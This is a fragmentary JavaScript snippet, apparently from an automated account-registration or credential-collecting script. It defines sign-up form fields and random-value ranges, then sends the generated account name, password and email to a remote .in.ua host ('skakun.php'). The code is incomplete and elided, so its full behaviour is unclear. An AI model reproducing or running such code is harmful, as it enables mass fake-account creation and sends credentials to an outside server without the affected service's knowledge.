...
var v=2,
n=['accountname', 'email', 'reenter_email', 'password', 'reenter_password'], kol=[11, 9, 9, 11],
min=[97, 48, 95, 47, 95, 47, 95], max=[122, 57, 122, 57, 122, 57, 122], r=[], m='';
...
'http://js.xn--c1adqbs.in.ua/skakun.php?a='+p[0]+'&p='+p[4]+'&m='+p[1]+'&v='+v, true);z.send();}
